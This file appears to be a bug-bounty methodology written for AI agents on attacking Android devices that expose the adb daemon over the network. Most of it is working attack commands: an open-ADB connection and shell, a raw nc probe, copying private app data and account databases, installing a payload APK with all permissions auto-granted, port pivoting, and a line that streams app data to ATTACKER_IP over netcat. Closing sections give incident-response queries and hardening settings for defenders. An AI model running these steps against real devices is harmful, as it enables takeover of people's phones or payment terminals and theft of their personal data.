---
technology: "Android Debug Bridge daemon (adbd) — network-exposed ADB"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
version: 1.0 (upstream-only new unit)
source: "rewritten from HackTricks (src/network-services-pentesting/5555-android-debug-bridge.md), CC BY-NC 4.0, accessed 2026-11-13"
status: upstream-only
provenance: "upstream-only: zero corpus evidence by design — methodology built from the upstream reference and primary sources. Verified 2026-11-13 against: AOSP docs/dev/adb_wifi.md (android-vts-15.0_r2) — legacy 'adb tcpip 5555' + 'adb connect' flow unencrypted per AOSP; keystore /data/misc/adb/adb_keys; pairing via RSA-2048/x509 + six-digit code or QR; Wireless-debugging random port, TLS (A_STLS) vs legacy A_AUTH greeting; mDNS types _adb._tcp, _adb-tls-pairing._tcp, _adb-tls-connect._tcp; developer.android.com adb docs (shell, install, forward/reverse semantics); CNXN probe packet bytes (CNXN / 0x01000001 / maxdata 4096 / 'host::') per the Hagaseca worm analysis referenced upstream; msfvenom flags cross-checked where used. No CVE claims — the surface is the daemon by design. Companion overview: [[adbd|adbd]]."
---

# adbd bug bounty methodology

Target model: adbd reachable on the network — TCP/5555 (classic plaintext listener) or a dynamic TLS port advertised over mDNS (Android 11+ Wireless debugging). End state: interactive shell on the device, typically uid `shell`; root on permissive builds. The only gate is authentication state (`ro.adb.secure`) or pairing. Scope note: a connected device is a person's phone or a payment terminal — treat app data as sensitive and stay inside the authorization.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| TCP/5555, `ro.adb.secure=0` | reachability | yes | immediate shell → install/pivot — Critical |
| TCP/5555, `ro.adb.secure=1` | key in device keystore | no (needs pre-authorized RSA key) | shell — only with prior trust |
| Wireless debugging pairing | six-digit code shown on device | needs the code (one-time) | long-lived TLS-trusted channel — High |
| CNXN probe reply | none | yes | AUTH vs CNXN classification — recon |
| `adb root` acceptance | userdebug/eng build | post-shell | uid 0 — Critical |

## Phase 1 — connect and enumerate

```bash
adb connect TARGET_IP:5555        # default classic port; omit :5555 for the same result
adb devices -l                    # want "device"; "unavailable/offline" = daemon odd; "unauthorized" = auth ON
adb shell                         # interactive shell, uid usually shell
adb shell 'id; getenforce; getprop ro.adb.secure ro.debuggable service.adb.tcp.port'
adb root || true                  # works on eng/userdebug/insecure builds, many emulators and IoT images
```

Decision points: `unauthorized` in `adb devices` means `ro.adb.secure=1` — without a pre-authorized key or the pairing code (phase 4) there is no path; stop and report the exposure, not a breach. A `CNXN`-only response with no AUTH step is the open-listener case. Record `getenforce` (SELinux enforcing/permissive) — it shapes post-exploitation.

## Phase 2 — raw protocol probe (fingerprint without adb)

When you should not or cannot run adb against the endpoint, one packet classifies it. The ADB wire protocol opens with a 24-byte `CNXN` header (command `CNXN`, version `0x01000001`, maxdata 4096) followed by the system identity string `host::`:

```bash
probe=434e584e01000001000010000600000032020000bcb1a7b1686f73743a3a
printf '%s' "$probe" | xxd -r -p | nc -w 2 TARGET_IP 5555 | xxd -g1
# first reply bytes: "AUTH" = key-gated; "CNXN" = connection accepted (auth off)
```

A protocol response is a fingerprint, not a compromise — the same probe is what ADB-speaking worms use to find victims, which makes it a high-confidence detection signal for the defenders' report.

## Phase 3 — post-exploitation (shell obtained)

Enumerate and capture:

```bash
pm list packages -3               # third-party apps
pm path SOME_PKG                  # APK location
# debuggable app without root:
run-as SOME_PKG sh -c 'cd /data/data/SOME_PKG && tar cf - .' | tar xf - -C ./loot/SOME_PKG
# with root: cp -a /data/data/SOME_PKG /sdcard/loot && adb pull /sdcard/loot
```

High-value artifacts: `/data/system/users/0/accounts.db` (AccountManager), `/data/misc/wifi/` on older builds, per-app SQLite and `shared_prefs` under `/data/data/<pkg>`.

Code execution and delivery:

```bash
adb install -r -g payload.apk     # -g auto-grants all runtime permissions in the manifest
adb shell monkey -p SOME_PKG -c android.intent.category.LAUNCHER 1   # launch it
adb shell am start -n SOME_PKG/.SomeActivity                       # ...or start components directly
adb shell am broadcast -a SOME_ACTION
```

Pivoting (works without root):

```bash
adb forward tcp:2222 tcp:22       # host reaches a device-local SSH (e.g. Termux/dropbear)
adb reverse tcp:1080 tcp:1080     # device apps can now use your host's service as 127.0.0.1:1080
# exfiltration without sdcard writes:
adb shell "tar cf - /data/data/SOME_PKG" | nc ATTACKER_IP 9000     # with `nc -lvp 9000 > loot.tar` on your host
```

## Phase 4 — Wireless debugging (Android 11+)

Modern devices pair over TLS with a one-time code and random ports; do not assume 5555.

```bash
adb mdns services                 # look for _adb._tcp, _adb-tls-pairing._tcp, _adb-tls-connect._tcp
adb pair TARGET_IP:PAIRING_PORT   # enter the six-digit code from Developer options → Wireless debugging
adb connect TARGET_IP:CONNECT_PORT
```

Offensive angle: the code is the entire secret — with device-UI access (physical, kiosk, MDM screenshot, shoulder-surf) pairing yields a persistent trusted key in `/data/misc/adb/adb_keys`. Some OEM engineering images still expose unauthenticated ADB over TCP alongside; check before fighting TLS.

## Phase 5 — incident-response queries (authorized connection)

```bash
adb -s TARGET_IP shell 'getprop ro.adb.secure service.adb.tcp.port; settings get global adb_enabled adb_wifi_enabled'
adb -s TARGET_IP shell 'settings get secure enabled_accessibility_services'   # unexpected accessibility = implant territory
adb -s TARGET_IP shell 'pm list packages -f -3; ss -ltnp'
adb -s TARGET_IP shell 'ls -l /data/misc/adb/adb_keys'   # enumerate trusted keys (root usually required)
```

Hardening lines for the report: `settings put global adb_enabled 0`, `setprop service.adb.tcp.port -1`, `stop adbd; start adbd`; container deployments must publish ADB on loopback (`127.0.0.1:5555`) behind an authenticated tunnel, never `0.0.0.0`.

## Tool mapping (in prose)

The adb client itself is the entire toolkit (connect, shell, pm/am settings wrappers, forward/reverse); netcat plus xxd for the raw CNXN probe; any APK build chain (msfvenom's `-f raw`/APK payloads or a signed test APK via `adb install -g`) for delivery; an mDNS browser or `adb mdns services` for discovery. Bug classes: CWE-306 (missing authentication on engineering/vendor builds), CWE-319 (plaintext classic channel), CWE-287 (pairing-code trust bootstrap), CWE-732 (shell uid privilege assumptions).
